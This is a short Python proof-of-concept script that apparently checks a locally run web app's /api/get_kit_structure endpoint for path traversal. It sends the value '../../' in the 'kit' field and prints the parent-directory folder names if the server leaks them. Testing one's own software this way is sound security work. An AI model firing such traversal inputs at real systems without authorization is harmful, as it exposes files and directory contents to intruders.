import requests
import json

BASE_URL = "http://localhost:8000"

def test_path_traversal():
    print("Testing Path Traversal on /api/get_kit_structure...")
    # Vulnerable parameter: 'kit'
    # We attempt to reach the root of the drive or at least the project root
    payload = {
        "kit": "../../" 
    }
    
    try:
        response = requests.post(f"{BASE_URL}/api/get_kit_structure", json=payload)
        print(f"Status: {response.status_code}")
        data = response.json()
        if data.get("success"):
            print("VULNERABILITY CONFIRMED!")
            print("Contents of parents directory leaked:")
            # Just print the first few to prove it
            for part in data.get("parts", [])[:5]:
                print(f" - {part.get('folder')}")
        else:
            print(f"Server rejected request: {data.get('message')}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_path_traversal()
